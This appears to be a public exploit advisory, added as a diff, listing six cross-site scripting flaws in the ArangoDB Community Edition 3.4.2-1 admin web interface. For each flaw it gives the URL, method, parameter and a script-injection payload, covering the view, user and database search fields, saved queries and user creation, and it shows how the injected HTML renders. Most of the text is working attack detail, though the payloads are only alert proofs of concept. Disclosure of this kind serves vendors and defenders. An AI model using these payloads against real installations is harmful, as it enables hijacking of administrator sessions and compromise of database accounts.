@@ -1,0 +1,124 @@
+##################################################################################################################################
+# Exploit Title: ArangoDB Community Edition 3.4.2-1 | Cross-Site Scripting
+# Date: 17.02.2019
+# Exploit Author: Ozer Goker
+# Vendor Homepage: https://www.arangodb.com
+# Software Link: https://www.arangodb.com/download-major/
+# Version: 3.4.2-1
+##################################################################################################################################
+
+Introduction
+
+ArangoDB is a native multi-model, open-source database with flexible data
+models for documents, graphs, and key-values. Build high performance
+applications using a convenient SQL-like query language or JavaScript
+extensions. Use ACID transactions if you require them. Scale horizontally
+and vertically with a few mouse clicks.
+
+#################################################################################
+
+XSS details: DOM Based & Reflected & Stored
+
+#################################################################################
+
+XSS1 | DOM Based XSS - Search
+
+URL
+http://127.0.0.1:8529/_db/_system/_admin/aardvark/index.html#views
+
+
+PAYLOAD
+"><script>alert(1)</script>
+
+<div class="search-field">
+      <input type="text" value=""><script>alert(1)</script>"
+id="viewsSearchInput" class="search-input" placeholder="Search..."/>
+      <i id="viewsSearchSubmit" class="fa fa-search"></i>
+</div>
+
+#################################################################################
+
+XSS2 | Reflected & Stored - Save as
+
+URL
+http://127.0.0.1:8529/_db/_system/_admin/aardvark/index.html#queries
+http://127.0.0.1:8529/_db/_system/_api/user/root
+
+METHOD
+PATCH
+
+PARAMETER
+name
+
+PAYLOAD
+"><script>alert(2)</script>
+
+#################################################################################
+
+XSS3 | Stored - Delete query
+
+URL
+http://127.0.0.1:8529/_db/_system/_admin/aardvark/index.html#queries
+http://127.0.0.1:8529/_db/_system/_api/user/root
+
+METHOD
+Get
+
+#################################################################################
+
+XSS3 | Reflected & Stored - Add User
+
+URL
+http://127.0.0.1:8529/_db/_system/_admin/aardvark/index.html#users
+http://127.0.0.1:8529/_db/_system/_api/user
+http://127.0.0.1:8529/_db/_system/_admin/aardvark/index.html#user/%22%3E%3Cscript%3Ealert(3)%3C%2Fscript%3E
+
+METHOD
+Post
+
+PARAMETER
+user,name
+
+PAYLOAD
+"><script>alert(3)</script>
+"><script>alert(4)</script>
+
+#################################################################################
+
+XSS5 | DOM Based XSS - Search
+
+URL
+http://127.0.0.1:8529/_db/_system/_admin/aardvark/index.html#users
+
+
+PAYLOAD
+"><script>alert(5)</script>
+
+<div class="search-field">
+      <input type="text" value=""><script>alert(5)</script>"
+id="userManagementSearchInput" class="search-input"
+placeholder="Search..."/>
+      <!-- <img id="userManagementSearchSubmit" class="search-submit-icon">
+-->
+      <i id="userManagementSearchSubmit" class="fa fa-search"></i>
+</div>
+
+#################################################################################
+
+XSS6 | DOM Based XSS - Search
+
+URL
+http://127.0.0.1:8529/_db/_system/_admin/aardvark/index.html#databases
+
+
+PAYLOAD
+"><script>alert(6)</script>
+
+<div class="search-field">
+      <input type="text" value=""><script>alert(6)</script>"
+id="databaseSearchInput" class="search-input" placeholder="Search..."/>
+      <!-- <img id="databaseSearchSubmit" class="search-submit-icon">-->
+      <i id="databaseSearchSubmit" class="fa fa-search"></i>
+</div>
+
+#################################################################################
